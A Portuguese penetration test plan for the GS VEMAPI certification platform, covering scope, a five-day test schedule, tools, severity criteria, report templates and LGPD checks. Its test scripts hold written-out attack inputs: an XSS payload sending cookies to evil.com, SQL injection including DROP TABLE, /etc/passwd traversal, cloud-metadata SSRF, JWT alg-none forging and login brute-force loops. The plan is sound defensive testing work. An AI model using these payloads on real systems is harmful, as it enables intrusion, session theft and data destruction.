# 🛡️ Plano de Teste de Penetração — GS VEMAPI

**Versão:** 1.0 — Julho 2026
**Classificação:** CONFIDENCIAL — Uso Interno
**Equipe de Segurança:** GS VEMAPI

---

## Índice

1. [Escopo do Teste](#1-escopo-do-teste)
2. [Metodologia](#2-metodologia)
3. [Cronograma Detalhado (5 Dias)](#3-cronograma-detalhado-5-dias)
4. [Ferramentas](#4-ferramentas)
5. [Critérios de Severidade](#5-critérios-de-severidade)
6. [Templates de Reporte](#6-templates-de-reporte)
7. [Checklist de Conformidade LGPD](#7-checklist-de-conformidade-lgpd)
8. [Aprovação e Próximos Passos](#8-aprovação-e-próximos-passos)

---

## 1. Escopo do Teste

### 1.1 Alvo

**Sistema:** GS VEMAPI — Plataforma de Gestão para AR/AC (Certificação Digital ICP-Brasil)

**Componentes no escopo:**

| Componente | Tecnologia | Descrição |
|-----------|-----------|-----------|
| Frontend Web | Next.js 16.1.3 + React 19 | Portal do AGR, Admin, Landing Page |
| API Routes | Next.js API (Node.js) | 10 endpoints funcionais (ac/sign, auth/pki, cpf, cnpj, psbio, saf, video, protocol, protocol/update, protocols/audit) |
| API .NET | ASP.NET Core 8 (CoreAr) | 4 microsserviços (Identity, Checkout, Crm, Management) |
| Database | Supabase (PostgreSQL) | Schema GS multi-tenant + Schema ANGRY |
| Storage | S3 / R2 (Cloudflare) | Documentos e artefatos criptografados |
| Identity | ASP.NET Identity + JWT + Refresh Tokens | Autenticação e sessão |
| Pagamentos | Asaas (via API) | Processamento de pagamentos (fora do escopo) |

### 1.2 URLs-Alvo

| Ambiente | URL | Tipo |
|----------|-----|------|
| Produção | `https://app.vemapi.com.br` | Black-box |
| Staging | `https://staging.vemapi.com.br` | Black-box + Gray-box |
| Desenvolvimento | `http://localhost:3001` (Next.js), `http://localhost:5000` (.NET) | Gray-box |

### 1.3 Período

**5 dias úteis consecutivos** (40h de esforço, 1 pentester)

### 1.4 Tipo de Teste

**Black-box + Gray-box**
- Black-box: testes externos sem credenciais
- Gray-box: acesso à documentação técnica, schema do banco, código-fonte (supabase schema, security.ts, api-middleware.ts)

### 1.5 Equipe

- **1 pentester** sênior (alocação full-time)
- **1 ponto focal** do cliente (desenvolvedor responsável)

### 1.6 Restrições Explícitas

| Restrição | Justificativa |
|-----------|--------------|
| ❌ Não testar infraestrutura do Asaas | Terceiro — PCI-DSS Level 1 |
| ❌ Não realizar DoS/DDoS | Pode afetar disponibilidade |
| ❌ Não modificar dados reais de produção | Testes apenas em staging ou dados mock |
| ❌ Não testar redes internas ou infra AWS | Fora do escopo |
| ⚠️ Não realizar engenharia social | Escopo puramente técnico |
| ⚠️ Não testar endpoints sem autorização prévia | Cada endpoint deve ser validado com o time |

### 1.7 Ambientes e Endpoints Mapeados

**Next.js API Routes (10 endpoints):**

| Método | Endpoint | Autenticação | Descrição |
|--------|----------|--------------|-----------|
| POST | `/api/auth/pki` | Nonce | Autenticação PKI (A3/Cloud) |
| GET | `/api/auth/pki` | Não | Geração de nonce para desafio |
| POST | `/api/ac/sign` | Não (mock) | Assinatura de CSR pela AC |
| POST | `/api/ac/persist-certificate` | Não (mock) | Persistência de certificado emitido |
| POST | `/api/cpf` | Não | Consulta CPF (KYC mock) |
| POST | `/api/cnpj` | Não | Consulta CNPJ (BrasilAPI) |
| POST | `/api/psbio` | Não | Validação biométrica |
| POST | `/api/saf` | Não | Sistema Anti-Fraude |
| POST | `/api/video` | Não | Criação de sala de videoconferência |
| POST | `/api/protocol/update` | Não | Atualização de protocolo |
| POST | `/api/protocols/audit` | Não | Registro de auditoria |

**.NET CoreAr API (endpoints conhecidos):**

| Método | Endpoint | Autenticação | Descrição |
|--------|----------|--------------|-----------|
| POST | `/api/auth/login` | Não | Login com email+senha |
| POST | `/api/auth/refresh-token` | Cookie | Rotação de refresh token |
| POST | `/api/auth/logout` | JWT | Logout com revogação |
| GET | `/api/auth/me` | JWT | Dados do usuário atual |
| GET | `/api/orders` | JWT | Lista de pedidos (paginada) |
| GET | `/api/orders/{id}` | JWT | Detalhe do pedido |
| POST | `/api/orders/{id}/transition` | JWT + RBAC | Transição de status |
| POST | `/api/webhooks/gateway` | HMAC | Webhook de pagamento |
| GET | `/api/management/tenants/hierarchy` | JWT | Hierarquia de tenants |
| POST | `/api/management/tenants/ar` | JWT + RBAC | Criar AR |
| POST | `/api/management/tenants/impersonate` | JWT + RBAC | Impersonação |

---

## 2. Metodologia

### 2.1 Referências Técnicas

| Padrão | Aplicação |
|--------|-----------|
| **OWASP Testing Guide v4.2** | Framework geral de testes web |
| **OWASP API Security Top 10** | Foco específico em APIs REST |
| **LGPD (Lei 13.709/2018)** — Arts. 46 a 50 | Segurança de dados pessoais |
| **ICP-Brasil** — DOC-ICP-01 a 05 | Requisitos para AC/AR |
| **PCI-DSS** (via Asaas) | Conformidade de pagamentos (escopo reduzido) |
| **NIST SP 800-115** | Metodologia de teste de penetração |
| **CWE Top 25** | Classificação de fraquezas de software |

### 2.2 Abordagem

```
FASE 1 ─── Reconhecimento ───→ Mapear superfície de ataque
   ↓
FASE 2 ─── Autenticação ─────→ Quebrar mecanismos de login
   ↓
FASE 3 ─── Autorização ──────→ Escalar privilégios
   ↓
FASE 4 ─── Input Validation ─→ Injetar payloads maliciosos
   ↓
FASE 5 ─── Lógica Negócio ───→ Explorar falhas de fluxo
```

### 2.3 Matriz de Risco

Avaliamos cada vulnerabilidade com base em:
- **Probabilidade**: Baixa / Média / Alta (facilidade de exploração)
- **Impacto**: Baixo / Médio / Alto (dano ao negócio)
- **Severidade final**: Combinação dos dois fatores conforme seção 5

---

## 3. Cronograma Detalhado (5 Dias)

### Dia 1 — Reconhecimento e Mapeamento (8h)

**Objetivo:** Mapear integralmente a superfície de ataque do sistema.

| Horário | Atividade | Ferramentas | Detalhamento |
|---------|-----------|-------------|--------------|
| 08:00–09:00 | Revisão de documentação | — | Ler SECURITY_ARCHITECTURE.md, schemas SQL, códigos-fonte |
| 09:00–10:30 | Mapeamento de endpoints | Burp Suite, curl, DevTools | Catalogar todas as rotas Next.js + .NET + Supabase |
| 10:30–11:00 | Fingerprinting de tecnologias | Wappalyzer, whatweb, curl -I | Identificar versões: Next.js, .NET, Supabase, Asaas |
| 11:00–12:00 | Mapeamento de APIs públicas vs autenticadas | Burp (repeater/scanner) | Testar cada endpoint com/sem token |
| 13:00–14:00 | Identificação de uploads | Navegação manual + grep | Buscar `<input type="file"`, `multipart/form-data` |
| 14:00–15:00 | Identificação de formulários | Navegação manual | Mapear todos os inputs do sistema |
| 15:00–16:00 | Análise de JavaScript | DevTools Sources, grep | Buscar tokens, URLs internas, secrets expostos |
| 16:00–17:00 | Documentação dos achados | Markdown | Consolidar mapa de endpoints e tecnologias |

**Checkpoint:** Mapa completo de endpoints com classificação pública/autenticada/admin.

**Entregáveis:**
- [ ] Mapa de endpoints (planilha ou draw.io)
- [ ] Lista de tecnologias e versões identificadas
- [ ] Relatório de informações expostas em JS/client-side

**Testes específicos para este ambiente:**

```bash
# 1. Mapear todas as rotas Next.js
curl -s -I https://staging.vemapi.com.br/api/ | grep -i "x-nextjs"
curl -s https://staging.vemapi.com.br/api/cpf?cpf=00000000000
curl -s https://staging.vemapi.com.br/api/cnpj?cnpj=00000000000000

# 2. Testar CORS
curl -s -I -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" \
  https://staging.vemapi.com.br/api/auth/me

# 3. Verificar headers de segurança
curl -s -I https://staging.vemapi.com.br | grep -E "^(content-security-policy|strict-transport-security|x-frame-options|x-content-type-options|referrer-policy)"
```

---

### Dia 2 — Autenticação e Sessão (8h)

**Objetivo:** Identificar falhas nos mecanismos de autenticação (PKI + JWT + 2FA).

| Horário | Atividade | Ferramentas | Detalhamento |
|---------|-----------|-------------|--------------|
| 08:00–09:00 | Bypass de login | SQLMap, curl, manual | Forçar SQLi/NoSQLi nos campos email e senha |
| 09:00–10:00 | Força bruta / Rate limiting | ffuf, Burp Intruder | Testar limite de 5 tentativas/minuto no `/api/auth/login` |
| 10:00–11:30 | Análise de JWT | jwt_tool, jwt.io | Testar: algorithm none, HS256 vs RS256, payload tampering, expiração |
| 11:30–12:00 | Teste de 2FA/TOTP | Script Python (pyotp) | Bypass de TOTP, brute force de código 6 dígitos, reuse de tempToken |
| 13:00–14:00 | Session fixation e logout | Burp Repeater | Verificar se session_id muda após login; logout revoga token? |
| 14:00–15:00 | Cookie security | DevTools, curl | Testar httpOnly, Secure, SameSite, Path Scope |
| 15:00–16:00 | CORS e CSRF | Burp, script custom | Testar origens não autorizadas, mutation endpoints sem token CSRF |
| 16:00–17:00 | Refresh token rotation | Burp | Reutilizar refresh token antigo; verificar se é invalidado |

**Checkpoint:** Status de cada mecanismo de autenticação documentado.

**Roteiro de testes:**

```
1. SQLi nos campos de login:
   - email: admin@teste.com' OR '1'='1' --
   - email: admin@teste.com'; DROP TABLE gs_usuarios; --
   - email: { "$gt": "" }  (NoSQLi)

2. JWT manipulation:
   - Decodificar token → alterar "nivel" de "UNIDADE_AGR" para "AC_ADMIN"
   - Trocar algoritmo para "none": { "alg": "none", "typ": "JWT" }
   - Testar expiração: usar token com exp passado

3. Rate limiting test:
   for i in {1..15}; do
     curl -s -X POST https://staging/api/auth/login \
       -H "Content-Type: application/json" \
       -d '{"email":"x@x.com","password":"wrong'$i'"}' \
       -w "\nHTTP %{http_code}\n"
   done

4. Cookie security check:
   curl -s -X POST https://staging/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"email":"admin@test.com","password":"xxx"}' \
     -v 2>&1 | grep -i "set-cookie"

5. CORS check:
   curl -s -I -H "Origin: https://malicious.com" -H "Access-Control-Request-Method: GET" \
     https://staging/api/orders -v 2>&1 | grep -i "access-control"
```

---

### Dia 3 — Autorização e RBAC (8h)

**Objetivo:** Quebrar o modelo de permissões hierárquicas multi-tenant.

| Horário | Atividade | Ferramentas | Detalhamento |
|---------|-----------|-------------|--------------|
| 08:00–09:30 | IDOR em pedidos | Burp Repeater | Trocar UUID em `/api/orders/{id}` de um usuário para outro |
| 09:30–10:30 | Escalação horizontal | Script Python | Tentar acessar dados de outros tenants (AR → AR diferente) |
| 10:30–11:30 | Escalação vertical | jwt_tool + Burp | Testar se OPERADOR consegue fazer ação de ADMIN |
| 11:30–12:00 | Multi-tenant isolation | Supabase RLS test | Verificar se dados de AR_A vazam para AR_B |
| 13:00–14:00 | Usuário inativo | Curl manual | Testar se token de usuário desativado ainda funciona |
| 14:00–15:00 | Token expirado | jwt_tool | Forjar token com exp no passado |
| 15:00–16:00 | JWT payload tampering | jwt_tool | Alterar claims: ar_id, unidade_id, nivel |
| 16:00–17:00 | Impersonação | Burp | Testar endpoint `/api/management/tenants/impersonate` |

**Checkpoint:** Validação do isolamento entre todos os níveis da hierarquia.

**Matriz de teste de RBAC:**

| Nível | Pode ver AR alheia? | Pode ver unidade alheia? | Pode criar pedido em outra AR? | Pode aprovar sem permissão? |
|-------|---------------------|-------------------------|-------------------------------|----------------------------|
| UNIDADE_AGR | ❌ | ❌ | ❌ | ❌ |
| UNIDADE_ADMIN | ❌ | ✅ (própria) | ❌ | ❌ |
| AR_ADMIN | ✅ (própria) | ✅ (própria) | ❌ | ✅ (própria) |
| AC_ADMIN | ✅ | ✅ | ✅ | ✅ |

Para cada célula, testar via requisição direta à API (não confiar no frontend).

**Testes específicos:**

```bash
# IDOR test: trocar UUID do pedido
curl -s -H "Authorization: Bearer $TOKEN_A" \
  https://staging/api/orders/$(UUID_DO_PEDIDO_DE_OUTRO_USUARIO)

# Escalação vertical: UNIDADE_AGR tenta criar AR
curl -s -X POST -H "Authorization: Bearer $TOKEN_AGR" \
  -H "Content-Type: application/json" \
  -d '{"nome":"Nova AR","cnpj":"xx"}' \
  https://staging/api/management/tenants/ar

# Testar se listagem respeita tenant
curl -s -H "Authorization: Bearer $TOKEN_AR_A" \
  https://staging/api/orders?page=1\&pageSize=100
# Verificar se retorna pedidos de AR_B
```

---

### Dia 4 — Input Validation e Data Protection (8h)

**Objetivo:** Identificar vulnerabilidades clássicas de injeção e vazamento de dados.

| Horário | Atividade | Ferramentas | Detalhamento |
|---------|-----------|-------------|--------------|
| 08:00–09:30 | XSS (todos os tipos) | Burp Intruder, XSS polyglots | Testar reflected, stored, DOM-based em inputs |
| 09:30–10:30 | SQL Injection | SQLMap, manual | Todos os parâmetros nas APIs |
| 10:30–11:00 | Command Injection | Burp Repeater | Parâmetros que vão para shell |
| 11:00–12:00 | Path Traversal e Upload | Burp, magic bytes | Tentar upload de arquivo malicioso, path traversal em filename |
| 13:00–14:00 | SSRF | Burp Collaborator | Testar se APIs fazem fetch para URLs fornecidas pelo usuário |
| 14:00–15:00 | LGPD — Vazamento de PII | Burp, grep em respostas | Buscar CPF, RG, CNH, email em respostas JSON, logs, URLs |
| 15:00–16:00 | Data Masking | Inspeção visual | Verificar se dados sensíveis seguem padrão de mascaramento |
| 16:00–17:00 | Security Headers | curl -I, Mozilla Observatory | Testar presença de CSP, HSTS, X-Frame-Options, etc. |

**Payloads de teste:**

```bash
# XSS Stored
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"titulo":"<script>fetch(\"https://evil.com/?c=\"+document.cookie)</script>","descricao":"teste"}' \
  https://staging/api/tickets

# SQLi em parâmetro de query
curl -s "https://staging/api/orders?search=joao' OR 1=1--"

# Path Traversal em filename (protocol/update)
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"id":"xxx","updates":{"face_photo_url":"../../../etc/passwd"}}' \
  https://staging/api/protocol/update

# SSRF via consulta CPF
curl -s "https://staging/api/cpf?cpf=http://169.254.169.254/latest/meta-data/"

# Testar CSP
curl -s -I https://staging.vemapi.com.br | findstr "content-security-policy"
```

**Testes de vazamento de PII:**

| Local a verificar | O que procurar | Risco |
|-------------------|---------------|-------|
| Respostas da API /api/cpf | CPF, nome, nome da mãe | 🔴 Alto |
| Respostas da API /api/auth/me | Email, nome, tenantId | 🟡 Médio |
| URL de parâmetros | CPF na query string (logs) | 🔴 Alto |
| Erros retornados | Stack traces, SQL queries | 🟡 Médio |
| Cookies | Tokens sem httpOnly | 🟠 Alto |
| SPA bundle (JS) | API keys, URLs internas | 🔴 Alto |

---

### Dia 5 — API e Lógica de Negócio (8h)

**Objetivo:** Explorar falhas na lógica de negócio, concorrência e estado.

| Horário | Atividade | Ferramentas | Detalhamento |
|---------|-----------|-------------|--------------|
| 08:00–09:00 | Rate limiting em todas as APIs | ffuf | Testar se cada endpoint tem proteção individual |
| 09:00–10:00 | Mass Assignment | Burp Repeater | Enviar campos não documentados (ex: "is_admin": true) |
| 10:00–11:00 | Race Conditions | Script Python (requests concorrentes) | Enviar duas requisições simultâneas de lock em protocolo |
| 11:00–11:30 | Paginação e brute force de tokens | Curl | Tentar acessar páginas seguintes sem permissão |
| 11:30–12:00 | Webhook Security | Script Python | Replay attack, assinatura HMAC inválida, idempotência |
| 13:00–14:00 | Error Handling | Fuzzing | Enviar JSON malformado, tipos inesperados, campos ausentes |
| 14:00–15:00 | Backup Codes / 2FA Recovery | Manual | Reutilizar backup code após uso; brute force |
| 15:00–16:00 | Download de documentos | Curl | Acessar signed URLs expiradas; download sem auth |
| 16:00–17:00 | Documentação final | — | Consolidar todos os achados |

**Testes de lógica de negócio:**

```python
# Race condition: dois AGRs tentam travar o mesmo protocolo
import asyncio
import aiohttp

async def lock_protocol(session, token):
    async with session.post(
        'https://staging/api/protocol/lock',
        json={"protocol_id": "uuid-do-protocolo"},
        headers={"Authorization": f"Bearer {token}"}
    ) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        results = await asyncio.gather(
            lock_protocol(session, TOKEN_AGR_A),
            lock_protocol(session, TOKEN_AGR_B),
        )
        print(results)  # Ambos podem travar? → Race condition!

# Replay attack no webhook
payload = '{"Evento":"transaction.paid","PedidoId":"xxx","ValorEmCentavos":10000}'
curl -s -X POST https://staging/api/webhooks/gateway \
  -H "Content-Type: application/json" \
  -H "X-Gateway-Signature: ASSINATURA_VALIDA" \
  -H "X-Idempotency-Key: MESMA_KEY_DE_ANTES" \
  -d "$payload"
# Verificar se processa novamente (falta de idempotência)

# Mass Assignment
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"nome":"Teste","email":"test@test.com","cpf":"00000000000","nivel":"AC_ADMIN"}' \
  https://staging/api/users
```

---

## 4. Ferramentas

### 4.1 Proxy e Interceptação

| Ferramenta | Versão | Uso |
|-----------|--------|-----|
| **Burp Suite Community** | 2026.x | Proxy de interceptação, repetição de requests, Intruder |
| **OWASP ZAP** | 2.16.x | Scanner automático complementar |

### 4.2 Automação e Fuzzing

| Ferramenta | Uso |
|-----------|-----|
| **curl** (nativo Windows) | Testes manuais de API |
| **ffuf** | Fuzzing de parâmetros, diretórios, subdomínios |
| **wfuzz** | Fuzzing de parâmetros POST |

### 4.3 Análise de JWT

| Ferramenta | Uso |
|-----------|-----|
| **jwt_tool** (Python) | Análise completa de JWT |
| **jwt.io** | Debug online de tokens |
| **jwt-cracker** | Força bruta de secret JWT |

### 4.4 Injeção SQL

| Ferramenta | Uso |
|-----------|-----|
| **SQLMap** | Detecção e exploração de SQLi |
| Manual | Injeções específicas PostgreSQL |

### 4.5 Scanner de Vulnerabilidades

| Ferramenta | Uso |
|-----------|-----|
| **Nikto** | Scanner de servidor web |
| **Mozilla Observatory** | Análise de security headers |
| **Nmap** | Varredura de portas (apenas staging) |

### 4.6 Testes de API

| Ferramenta | Uso |
|-----------|-----|
| **Postman / Insomnia** | Coleção de testes manuais |
| **Python (requests, aiohttp)** | Scripts de teste automatizado |
| **Node.js** | Testes de autenticação PKI |

### 4.7 Scripts Customizados

```bash
# Script de brute force de login (bash/curl)
for i in $(seq 1 20); do
  curl -s -X POST https://staging/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@test.com\",\"password\":\"senha$i\"}" \
    -o /dev/null -w "Tentativa $i: %{http_code}\n"
  sleep 0.5
done
```

---

## 5. Critérios de Severidade

### 5.1 Tabela de Severidade

| Severidade | Pontuação | Critério | Exemplo |
|-----------|-----------|----------|---------|
| 🔴 **Crítico** | 9.0–10.0 | Acesso não autorizado a dados sensíveis, RCE, escalação para AC_ADMIN, quebra total de autenticação | — SQLi na API de login (`/api/auth/login`)<br>— JWT bypass com algorithm none<br>— IDOR em `/api/orders/{id}` expondo dados de pagamento<br>— RCE via upload malicioso<br>— Acesso de UNIDADE_AGR a dados GLOBAIS |
| 🟠 **Alto** | 7.0–8.9 | Vazamento de PII, bypass de 2FA, quebra parcial de autenticação, escalação horizontal entre ARs | — CPF exposto em response da API `/api/cpf`<br>— Backup code reutilizável após uso<br>— Acesso de AR_ADMIN a dados de outra AR<br>— Signed URL expirada ainda funcional<br>— Nonce reutilizável |
| 🟡 **Médio** | 4.0–6.9 | Missing security headers, CSRF sem proteção, rate limit muito permissivo, information disclosure menor | — CSP ausente ou muito permissivo<br>— CORS com `Access-Control-Allow-Origin: *`<br>— Rate limit: 30/min em vez de 5/min<br>— Versão do Next.js exposta no header<br>— Stack trace em erro 500 |
| 🟢 **Baixo** | 1.0–3.9 | Falta de boas práticas, informações não críticas expostas, headers verbose | — Server header revelando `nextjs/16.1.3`<br>— Cookie sem `httpOnly` em endpoint não crítico<br>— Falta de `X-Content-Type-Options: nosniff`<br>— Diretório `.git` acessível |
| ⚪ **Info** | 0.0–0.9 | Recomendações de melhoria não críticas | — Ausência de 2FA obrigatório<br>— Sem registro de tentativas de login falhas<br>— Sugestão de melhoria na política de senha |

### 5.2 Matriz de Decisão

```
                   ┌─────────────────────────────────────┐
                   │            PROBABILIDADE             │
                   │      BAIXA      MÉDIA      ALTA     │
┌─────────────────┼─────────────────────────────────────┤
│    IMPACTO      │                                     │
│  ALTO           │      🟠 Alto     🔴 Crítico  🔴 Crítico │
│  MÉDIO          │      🟡 Médio    🟠 Alto     🔴 Crítico │
│  BAIXO          │      🟢 Baixo    🟡 Médio    🟠 Alto   │
└─────────────────┴─────────────────────────────────────┘
```

---

## 6. Templates de Reporte

### 6.1 Template Padrão

Toda vulnerabilidade encontrada deve ser documentada no formato abaixo.

```markdown
### ID: PT-2026-{NNN}
**Título:** {Título claro e objetivo}
**Severidade:** {🔴 Crítico / 🟠 Alto / 🟡 Médio / 🟢 Baixo / ⚪ Info}
**CWE:** {CWE-xxx}
**OWASP:** {OWASP Top 10 / API Security Top 10}
**Endpoint:** {Método} `/api/caminho/do/endpoint`
**Parâmetro:** {parâmetro vulnerável}

**Descrição:**
{Descrição detalhada do comportamento vulnerável}

**Impacto:**
{Impacto no negócio, dados expostos, ações possíveis}

**Pré-requisitos:**
- {Item 1}
- {Item 2}

**Reprodução:**
1. {Passo 1}
2. {Passo 2}
3. {Passo 3}

**Prova:**
```http
{Requisição HTTP de exemplo}
```

**Resposta:**
```http
{Resposta HTTP mostrando a vulnerabilidade}
```

**Recomendação:**
{Passos para corrigir a vulnerabilidade}

**LGPD:**
{Artigos da LGPD relacionados, se aplicável}
```

### 6.2 Exemplo Preenchido

```markdown
### ID: PT-2026-001
**Título:** IDOR em endpoint de pedidos permite acesso a dados de outros tenants
**Severidade:** 🔴 Crítico
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
**OWASP:** OWASP API Security Top 10 — API1: Broken Object Level Authorization
**Endpoint:** GET `/api/orders/{id}`
**Parâmetro:** `id` (UUID do pedido)

**Descrição:**
O endpoint GET /api/orders/{id} não valida se o usuário autenticado tem acesso ao
tenant (AR/Unidade) ao qual o pedido pertence. Ao trocar o UUID do pedido por um
UUID de outra AR, é possível visualizar dados completos de pedidos de outros
clientes, incluindo CPF, email e valor do certificado.

**Impacto:**
Vazamento de dados sensíveis (CPF, email, valor) de clientes de outras ARs.
Potencial violação de LGPD (Arts. 46 e 47). Dano à reputação da plataforma.

**Pré-requisitos:**
- Token JWT válido de qualquer nível (UNIDADE_AGR já é suficiente)
- Conhecer UUID de um pedido de outra AR (pode ser obtido via enumeração)

**Reprodução:**
1. Obter token JWT válido (logar como UNIDADE_AGR da AR_A)
2. Identificar UUID de pedido da AR_B (ex: via busca paginada sem filtro)
3. Fazer GET para `/api/orders/{uuid-da-AR-B}` com token da AR_A

**Prova:**
```http
GET /api/orders/a1b2c3d4-e5f6-7890-abcd-ef1234567890 HTTP/1.1
Host: staging.vemapi.com.br
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

**Resposta:**
```json
{
  "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "cliente": {
    "nome": "Cliente de OUTRA AR",
    "cpf": "123.456.789-00",
    "email": "cliente@outra-ar.com"
  },
  "valorTotal": 29900,
  "status": "EMITIDO"
}
```

**Recomendação:**
Adicionar validação de escopo de tenant no service OrderService.GetByIdAsync():
- Extrair tenantId (ar_id) do JWT do usuário
- Filtrar a query no banco WHERE ar_id = usuario.ar_id
- Se o pedido não pertencer ao tenant, retornar 404 (não 403 para não revelar existência)

**Referências:**
- OWASP API Security Top 10 — API1:2023 (Broken Object Level Authorization)
- CWE-639: Authorization Bypass Through User-Controlled Key
- LGPD Art. 46 (Segurança), Art. 47 (Sigilo)
```

### 6.3 Template de Resumo Executivo

```markdown
# Resumo Executivo — Teste de Penetração GS VEMAPI

**Período:** {data}
**Equipe:** {pentester}
**Escopo:** {resumo do escopo}

## Resultados Consolidados

| Severidade | Quantidade | Principais Achados |
|-----------|-----------|---------------------|
| 🔴 Crítico | {N} | {resumo} |
| 🟠 Alto | {N} | {resumo} |
| 🟡 Médio | {N} | {resumo} |
| 🟢 Baixo | {N} | {resumo} |
| ⚪ Info | {N} | {resumo} |
| **Total** | **{N}** | |

## Principais Riscos ao Negócio
1. {Risco mais crítico}
2. {Segundo risco mais crítico}
3. {Terceiro risco mais crítico}

## Conclusão
{Parágrafo conclusivo com recomendação de próximos passos}
```

---

## 7. Checklist de Conformidade LGPD

### 7.1 Princípios Gerais (Art. 6º)

| # | Requisito | Status | Evidência |
|---|-----------|--------|-----------|
| 6.I | Finalidade: dados tratados apenas para finalidade declarada | ⬜ Testar | Verificar `gs_termos_uso` |
| 6.II | Adequação: tratamento compatível com finalidade | ⬜ Testar | Revisar fluxos de coleta |
| 6.III | Necessidade: coleta apenas do mínimo necessário | ⬜ Testar | Verificar campos obrigatórios |
| 6.V | Qualidade dos dados: dados exatos e atualizados | ⬜ Testar | Verificar validação de CPF/data |
| 6.VI | Transparência: informação clara ao titular | ⬜ Testar | Verificar política de privacidade |
| 6.VII | Segurança: medidas técnicas e administrativas | ⬜ Testar | Este pentest |

### 7.2 Direitos do Titular (Art. 18)

| # | Direito | Endpoint/Fluxo | Status |
|---|---------|---------------|--------|
| 18.I | Confirmação da existência de tratamento | `GET /api/gs/lgpd/acesso` | ⬜ Testar |
| 18.II | Acesso aos dados | `GET /api/gs/lgpd/acesso` | ⬜ Testar |
| 18.III | Correção de dados incompletos/inadequados | `PUT /api/gs/lgpd/correcao` | ⬜ Testar |
| 18.IV | Exclusão de dados (anonimização/bloqueio) | `DELETE /api/gs/lgpd/exclusao` | ⬜ Testar |
| 18.V | Portabilidade | `GET /api/gs/lgpd/portabilidade` | ⬜ Testar |
| 18.VI | Revogação de consentimento | `POST /api/gs/lgpd/revogar` | ⬜ Testar |

### 7.3 Segurança (Arts. 46–50)

| # | Requisito | Implementação Atual | Status |
|---|-----------|---------------------|--------|
| 46 | Medidas de segurança adequadas | AES-256-GCM, TLS 1.3, bcrypt, JWT, RLS | ⬜ Verificar |
| 47 | Sigilo dos dados pessoais | Data masking (CPF, email) | ⬜ Testar masking |
| 48 | Notificação de violação em 48h | Plano de resposta a incidentes | ⬜ Verificar docs |
| 49 | Relatório de impacto (RIPD) | Não implementado | ⬜ Recomendar |
| 50 | Boas práticas e governança | Audit chain, logs imutáveis | ⬜ Verificar |

### 7.4 Checkpoints Técnicos

**Dados sensíveis identificados no sistema:**

| Tipo | Onde está | Criptografia | Mascarado? | Tempo de retenção |
|------|-----------|-------------|-----------|-------------------|
| CPF | `gs_usuarios`, `gs_clientes`, `agr_users`, logs | AES-256-GCM (coluna) | `***.456.789-**` | 5 anos |
| RG | `gs_clientes` (futuro) | AES-256-GCM (coluna) | `**.***.SSP-**` | Vigência + 90 dias |
| CNH | `gs_clientes` (futuro) | AES-256-GCM (coluna) | `***********` | Vigência + 90 dias |
| Email | `gs_usuarios`, `gs_clientes`, `protocols` | N/A (dado de contato) | `mar***@domain.com` | 5 anos |
| Endereço | `gs_clientes`, `protocols` | N/A (dado de contato) | Sim (parcial) | 5 anos |
| Dados pagamento | Não armazenado (Asaas token) | N/A | N/A | N/A |
| Certificado digital | `pem_content` em `issued_certificates` | AES-256-GCM | N/A | 10 anos |

**Checklist de verificação:**

- [ ] **Coleta apenas dados necessários**: revisar campos obrigatórios em formulários
- [ ] **Consentimento registrado**: verificar se `gs_termos_uso` armazena timestamp + IP + versão
- [ ] **Política de privacidade disponível**: link visível no login e cadastro
- [ ] **Dados mascarados em logs**: verificar se logs de auditoria (`audit_logs`, `gs_integracao_logs`) não contêm CPF/email
- [ ] **Criptografia em repouso**: AES-256-GCM para colunas PII (verificar se `GS_ENCRYPTION_KEY` está configurada)
- [ ] **Criptografia em trânsito**: TLS 1.3 (verificar HSTS configurado)
- [ ] **Prazo de retenção definido**: triggers de cleanup (ex: `cleanup_expired_nonces()`)
- [ ] **Procedimento de direitos**: endpoints LGPD funcionando corretamente
- [ ] **Notificação de violação**: plano documentado (verificar fora do código)
- [ ] **DPA assinado**: com Asaas e provedores de cloud
- [ ] **Registro de operações**: logs de auditoria com hash chain

### 7.5 Testes Específicos LGPD

```bash
# Teste 1: CPF aparece em resposta não autorizada?
curl -s https://staging/api/cpf?cpf=00000000000 | findstr "cpf"
# Resposta esperada: CPF NÃO deve aparecer sem autenticação

# Teste 2: Dados sensíveis em logs de erro?
curl -s -X POST https://staging/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"teste@teste.com","password":""}' \
  -v 2>&1 | findstr "cpf|email|stack"

# Teste 3: Query string com CPF?
GET /api/orders?search=123.456.789-00 → Verificar se CPF fica nos logs do servidor

# Teste 4: Data masking funciona?
curl -s -H "Authorization: Bearer $TOKEN" \
  https://staging/api/orders/xxx | findstr "cpf"
# Resposta esperada: "cpf": "***.456.789-**"
```

---

## 8. Aprovação e Próximos Passos

### 8.1 SLAs de Correção

| Severidade | Prazo para Correção | Prazo para Reteste |
|-----------|---------------------|-------------------|
| 🔴 Crítico | 48 horas úteis | 24h após correção |
| 🟠 Alto | 5 dias úteis | 48h após correção |
| 🟡 Médio | 15 dias úteis | 5 dias após correção |
| 🟢 Baixo | 30 dias úteis | 10 dias após correção |
| ⚪ Info | Próximo ciclo (6 meses) | Próximo pentest |

### 8.2 Fluxo de Correção

```
Vulnerabilidade reportada
    ↓
Time de desenvolvimento avalia e prioriza
    ↓
Correção implementada em branch separada
    ↓
Code review + testes automatizados
    ↓
Deploy em staging
    ↓
Reteste pelo pentester
    ↓
Se aprovado → deploy em produção
    ↓
Documentação atualizada
```

### 8.3 Cronograma de Reteste

| Atividade | Prazo |
|-----------|-------|
| Correção de críticos | 48h após relatório |
| Reteste de críticos | 72h após relatório |
| Correção de altos | 5 dias após relatório |
| Reteste de altos | 7 dias após relatório |
| Correção de médios | 15 dias após relatório |
| Correção de baixos | 30 dias após relatório |
| Reteste completo | 45 dias após relatório |

### 8.4 Próximas Atividades de Segurança

| Atividade | Frequência | Responsável |
|-----------|-----------|-------------|
| Teste de penetração completo | A cada 6 meses | Equipe de segurança |
